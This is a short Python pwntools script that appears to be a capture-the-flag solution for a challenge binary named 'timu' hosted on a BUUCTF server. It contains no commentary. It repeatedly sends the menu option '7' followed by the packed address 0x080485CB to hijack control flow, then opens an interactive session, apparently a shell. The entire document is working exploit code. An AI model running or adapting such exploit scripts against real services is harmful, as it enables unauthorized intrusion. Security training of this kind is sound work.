from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",29878)

sh.sendline(b'7')
sh.sendline(p32(0x080485CB))

sh.sendline(b'7')
sh.sendline(p32(0x080485CB))

sh.sendline(b'7')
sh.sendline(p32(0x080485CB))

sh.sendline(b'7')
sh.sendline(p32(0x080485CB))

sh.sendline(b'7')
sh.sendline(p32(0x080485CB))

sh.interactive()
